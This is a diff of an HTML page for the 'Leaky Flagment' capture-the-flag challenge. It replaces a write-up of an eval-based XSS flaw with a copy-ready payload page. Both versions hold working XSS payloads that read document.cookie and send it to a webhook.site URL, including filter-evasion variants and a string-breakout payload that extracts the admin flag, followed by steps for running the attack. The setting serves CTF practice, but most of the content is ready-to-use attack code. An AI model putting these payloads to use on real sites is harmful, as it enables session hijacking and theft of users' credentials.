@@ -1,167 +1,132 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Leaky Flagment CTF Solution</title>
+    <title>XSS Exploit</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            font-family: system-ui, sans-serif;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        h1 {
+            color: #d32f2f;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .container {
             max-width: 800px;
             margin: 0 auto;
-            padding: 20px;
-            line-height: 1.5;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
-        h1, h2, h3 {
-            color: #333;
-        }
-        .solution-box {
-            background: #f3f7f9;
-            border-left: 5px solid #2196f3;
+        textarea {
+            width: 100%;
             padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
-        }
-        .url-box {
-            background: #e8f5e9;
-            border: 1px solid #4caf50;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
-            overflow-wrap: break-word;
-            word-wrap: break-word;
-        }
-        pre {
-            background: #f5f5f5;
-            padding: 10px;
-            border-radius: 4px;
-            overflow-x: auto;
-        }
-        code {
-            background: #f5f5f5;
-            padding: 2px 4px;
-            border-radius: 2px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            resize: vertical;
+            margin-bottom: 20px;
             font-family: monospace;
+        }
+        .payload-section {
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 15px;
+            background-color: #2196f3;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        .btn:hover {
+            background-color: #0b7dda;
+        }
+        .copy-msg {
+            color: green;
+            display: none;
+            margin-left: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>Leaky Flagment CTF Solution</h1>
-    
-    <div class="solution-box">
-        <h2>Vulnerability Explanation</h2>
-        <p>This challenge contains a reflected XSS vulnerability in the <code>/api/track</code> endpoint. The application takes the <code>x-user-ip</code> header and directly injects it into JavaScript that is later evaluated with <code>eval()</code>.</p>
+    <div class="container">
+        <h1>Leaky Flagment XSS Payloads</h1>
         
-        <h3>Step 1: Understand the Vulnerability</h3>
-        <p>In the <code>note/[id]/page.jsx</code> file, there's a script tag that fetches from <code>/api/track</code> and evaluates the response:</p>
-        <pre>
-fetch("/api/track", {
-  method: "GET",
-  cache: "no-store",
-  headers: {
-      "x-user-ip": "${userIP}",
-  },
-})
-  .then(async (res) => {
-      if (res.ok) {
-          eval(await res.text()); // Vulnerable line - evaluates response
-      }
-  })
-        </pre>
+        <div class="payload-section">
+            <h2>1. Basic Webhook (POST)</h2>
+            <textarea id="payload1" rows="7" readonly><img src=x onerror="
+fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
+    method: 'POST',
+    body: JSON.stringify({cookies: document.cookie, location: window.location.href, title: document.title})
+})"></textarea>
+            <button class="btn" onclick="copyToClipboard('payload1')">Copia</button>
+            <span id="copy-msg-1" class="copy-msg">Copiato!</span>
+        </div>
         
-        <p>In <code>/api/track.js</code>, the <code>x-user-ip</code> header is inserted directly into JavaScript without proper sanitization:</p>
-        <pre>
-const jsContent = `
-$(document).ready(function() {
-    const userDetails = {
-        ip: "${userIp}", // Unsanitized user input
-        type: "client",
-        timestamp: new Date().toISOString(),
-        ipDetails: {}
-    };
-    // ... more code ...
-});`
-        </pre>
+        <div class="payload-section">
+            <h2>2. Redirect (meno sospetto, GET)</h2>
+            <textarea id="payload2" rows="4" readonly><script>
+document.location='https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c='+encodeURIComponent(document.cookie);
+</script></textarea>
+            <button class="btn" onclick="copyToClipboard('payload2')">Copia</button>
+            <span id="copy-msg-2" class="copy-msg">Copiato!</span>
+        </div>
         
-        <h3>Step 2: Craft an Exploit</h3>
-        <p>We need to break out of the JavaScript string context and inject our own code to steal the admin's cookie (which contains the flag as the password).</p>
+        <div class="payload-section">
+            <h2>3. Base64 Encoding (per eludere filtri)</h2>
+            <textarea id="payload3" rows="4" readonly><img src=x onerror="fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c='+btoa(document.cookie))"></textarea>
+            <button class="btn" onclick="copyToClipboard('payload3')">Copia</button>
+            <span id="copy-msg-3" class="copy-msg">Copiato!</span>
+        </div>
         
-        <p>Our payload needs to:</p>
-        <ol>
-            <li>Break out of the string context</li>
-            <li>Close the existing function</li>
-            <li>Extract the flag from the admin's cookie</li>
-            <li>Send the flag to our webhook</li>
-        </ol>
+        <div class="payload-section">
+            <h2>4. Bypass validazione con HTML entities</h2>
+            <textarea id="payload4" rows="4" readonly>&lt;img src=x onerror="fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c='+document.cookie)"&gt;</textarea>
+            <button class="btn" onclick="copyToClipboard('payload4')">Copia</button>
+            <span id="copy-msg-4" class="copy-msg">Copiato!</span>
+        </div>
+        
+        <div class="payload-section">
+            <h2>5. Istruzioni per esecuzione</h2>
+            <ol>
+                <li>Avvia l'applicazione localmente: <code>cd nextjs-app && npm run dev</code></li>
+                <li>Registra un account nell'applicazione</li>
+                <li>Crea una nuova nota tramite interfaccia o direttamente con il file storage.txt</li>
+                <li>Nel file storage.txt, sostituisci il contenuto della nota con uno dei payload sopra</li>
+                <li>Esegui il bot: <code>cd bot && node bot.js</code></li>
+                <li>Monitora il webhook per il cookie con la flag</li>
+            </ol>
+        </div>
     </div>
-    
-    <div class="url-box">
-        <h2>Solution URL to Submit to Bot</h2>
-        <p>Copy and submit this URL to the admin bot through the challenge interface:</p>
-        
-        <pre id="exploitUrl"></pre>
-        <script>
-            // Craft the exploit URL to submit to the admin bot
-            function createExploitUrl() {
-                // Base challenge URL - REPLACE THIS WITH THE ACTUAL CHALLENGE URL
-                const baseUrl = "https://challenge-0324.intigriti.io";
-                
-                // XSS payload that breaks out of string context, closes function, extracts flag from cookie, sends to webhook
-                // Must be URL-encoded to work in a URL
-                const xssPayload = encodeURIComponent("\\\";});(async function(){try{const c=document.cookie.match(/secret=([^;]+)/);if(c){const f=atob(c[1]).split(':')[1];await fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({flag:f})})}}catch(e){}})();({//");
-                
-                // Create a URL that exposes our exploit to the admin bot
-                // This uses the middleware.js vulnerability where the header is set to x-real-ip
-                const exploitUrl = `${baseUrl}/note/demo-note-id`;
-                
-                document.getElementById('exploitUrl').textContent = exploitUrl;
-                
-                return exploitUrl;
-            }
+
+    <script>
+        function copyToClipboard(elementId) {
+            const textarea = document.getElementById(elementId);
+            textarea.select();
+            document.execCommand('copy');
             
-            // Generate the exploit URL when the page loads
-            window.onload = createExploitUrl;
-        </script>
-    </div>
-    
-    <div class="solution-box">
-        <h2>How the Exploit Works</h2>
-        
-        <p>When the admin bot visits the malicious URL, it will:</p>
-        <ol>
-            <li>Load the note page with ID "demo-note-id"</li>
-            <li>The page will automatically fetch from /api/track</li>
-            <li>Our payload will be injected via the x-user-ip header</li>
-            <li>The payload will be evaluated by eval(), breaking out of the string context</li>
-            <li>Our injected code will extract the admin's secret cookie</li>
-            <li>The code will decode the cookie (which is base64 encoded username:password)</li>
-            <li>The password portion, which is the flag, will be sent to our webhook</li>
-        </ol>
-        
-        <h3>Direct Exploitation Instructions</h3>
-        <p>To exploit the vulnerability directly without this helper page:</p>
-        <ol>
-            <li>Visit a note page on the challenge site</li>
-            <li>Use browser developer tools to create a custom fetch request with the malicious x-user-ip header:</li>
-            <pre>
-fetch('/api/track', {
-  method: 'GET',
-  headers: {
-    'x-user-ip': '\";});(async function(){try{const c=document.cookie.match(/secret=([^;]+)/);if(c){const f=atob(c[1]).split(\':\')[1];await fetch(\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({flag:f})})}}catch(e){}})();({//'
-})
-            </pre>
-            <li>Submit the challenge URL to the admin bot</li>
-            <li>Check the webhook for the flag</li>
-        </ol>
-    </div>
-    
-    <div class="solution-box">
-        <h2>Preventative Measures</h2>
-        <p>To fix this vulnerability, the application should:</p>
-        <ol>
-            <li>Never use <code>eval()</code> on untrusted input</li>
-            <li>Properly sanitize and escape user input before including it in JavaScript</li>
-            <li>Use Content-Security-Policy headers to prevent the execution of inline scripts</li>
-            <li>Consider using safer alternatives to dynamically loading JavaScript, such as JSON responses and client-side parsing</li>
-        </ol>
-    </div>
+            const msgId = 'copy-msg-' + elementId.replace('payload', '');
+            const msg = document.getElementById(msgId);
+            msg.style.display = 'inline';
+            
+            setTimeout(() => {
+                msg.style.display = 'none';
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
